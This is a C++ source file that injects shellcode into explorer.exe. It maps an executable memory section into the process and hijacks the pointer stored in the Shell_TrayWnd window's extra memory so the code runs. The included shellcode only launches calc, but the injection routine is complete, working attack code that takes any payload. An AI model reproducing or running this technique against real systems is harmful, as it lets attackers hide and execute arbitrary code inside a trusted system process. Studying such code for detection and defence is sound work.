/**
 * Filename: InjectExtraWindowMemory.cpp
 *
 * Run injected code in the context of explorer.exe.
 * This technique uses the fact that explorer.exe keep pointer
 * to the function in the extra window memory (in Shell_TrayWnd window).
 * So we need to replace this pointer to invoke shellcode.
 */
#define WIN32_LEAN_AND_MEAN
#include "ntapi.h"
#include <windows.h>
#include <tchar.h>
#include <cstdlib>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

BOOL
InjectCodeIntoExplorer(const BYTE* const shellcode, DWORD dwShellcodeSize)
{
    // Get functions addresses
    NTCREATESECTION NtCreateSection = (NTCREATESECTION)GetProcAddress(
        GetModuleHandle(_T("ntdll.dll")),
        "NtCreateSection"
    );
    NTMAPVIEWOFSECTION NtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(
        GetModuleHandle(_T("ntdll.dll")),
        "NtMapViewOfSection"
    );
    NTUNMAPVIEWOFSECTION NtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(
        GetModuleHandle(_T("ntdll.dll")),
        "NtUnmapViewOfSection"
    );
    NTCLOSE NtClose = (NTCLOSE)GetProcAddress(
        GetModuleHandle(_T("ntdll.dll")),
        "NtClose"
    );

    const TCHAR windowClassName[] = _T("Shell_TrayWnd");
    
    HWND          hWnd        = NULL;
    HANDLE        hSection    = NULL;
    HANDLE        hProcess    = NULL;
    SIZE_T        ViewSize    = 0;
    PVOID         SecAddress1 = nullptr;
    PVOID         SecAddress2 = nullptr;
    PDWORD        SecPtr      = nullptr;
    DWORD         status      = STATUS_UNSUCCESSFUL;
    DWORD&        pid         = status;
    DWORD&        temp        = status;
    LARGE_INTEGER SecSize     = { 0x1000, 0 };
    BYTE correctReturn[] = {
        0xBE, 0xFF, 0xFF, 0xFF, 0xFF, // mov esi, 0xFFFFFFFF <-- change
        0x8B, 0x06,                   // mov eax, [esi]
        0xFF, 0x20                    // jmp [eax]
    };
    
    __try {
        // Get window handle and target process handle
        hWnd = FindWindow(windowClassName, nullptr);
        if (NULL == hWnd) __leave;
        
        GetWindowThreadProcessId(hWnd, &pid);
        
        hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
        if (NULL == hProcess) __leave;
        
        status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr,
            &SecSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            nullptr
        );
        if (STATUS_SUCCESS != status) __leave;
        
        status = NtMapViewOfSection(
            hSection,
            GetCurrentProcess(),
            &SecAddress1,
            0,
            0,
            nullptr,
            &ViewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE
        );
        if (STATUS_SUCCESS != status) __leave;
        
        ViewSize = 0;
        status = NtMapViewOfSection(
            hSection,
            hProcess,
            &SecAddress2,
            0,
            0,
            nullptr,
            &ViewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE
        );
        if (STATUS_SUCCESS != status) __leave;
        
        // copy shellcode to the section
        SecPtr    = (PDWORD)SecAddress1;
        *SecPtr++ = (DWORD)SecAddress2 + 1 * sizeof(DWORD);
        *SecPtr++ = (DWORD)SecAddress2 + 2 * sizeof(DWORD); // double indirection
        RtlCopyMemory(SecPtr, shellcode, dwShellcodeSize);
        
        // copy the "correct-return" code
        SecPtr = PDWORD((PBYTE)SecPtr + dwShellcodeSize);
        temp = GetWindowLong(hWnd, 0);
        *(PDWORD)&correctReturn[0x1] = temp;
        RtlCopyMemory(SecPtr, correctReturn, sizeof(correctReturn));
        
        // invoke shellcode and restore original pointer
        SetWindowLong(hWnd, 0, (DWORD)SecAddress2);
        SendMessage(hWnd, WM_NULL, 0, 0);
        SetWindowLong(hWnd, 0, temp);
        
        //_tprintf(_T("Section mapped at the current process at address = %p\n"), SecAddress1);
        //_tprintf(_T("Section mapped at the explorer.exe at address = %p\n"), SecAddress2);
        //_tprintf(_T("Old pointer = %p\n"), temp);
    } __finally {
        // clean resources
        if (nullptr != SecAddress2) NtUnmapViewOfSection(hProcess, SecAddress2);
        if (nullptr != SecAddress1) NtUnmapViewOfSection(GetCurrentProcess(), SecAddress1);
        if (NULL != hProcess)       CloseHandle(hProcess);
        if (NULL != hSection)       NtClose(hSection);
    }
    
    return (STATUS_SUCCESS == status);
}

int
main(int argc, char *argv[])
{
    const BYTE kShellcode[] = {
        // WinExec("calc", 0)
        0x60, 0x89, 0xE0, 0x83, 0xE4, 0xFC, 0x50, 0x31,
        0xD2, 0x52, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x52, 0x51, 0x64, 0x8B, 0x72, 0x30, 0x8B,
        0x76, 0x0C, 0x8B, 0x76, 0x0C, 0xAD, 0x8B, 0x30,
        0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B, 0x5C,
        0x1F, 0x78, 0x8B, 0x74, 0x1F, 0x20, 0x01, 0xFE,
        0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x42, 0x42, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69,
        0x6E, 0x45, 0x75, 0xF0, 0x8B, 0x74, 0x1F, 0x1C,
        0x01, 0xFE, 0x03, 0x3C, 0xAE, 0xFF, 0xD7, 0x58,
        0x58, 0x5C, 0x61
    };
    if (InjectCodeIntoExplorer(kShellcode, sizeof(kShellcode))) {
        Sleep(INFINITE);
        return (EXIT_SUCCESS);
    }
    return (EXIT_FAILURE);
}
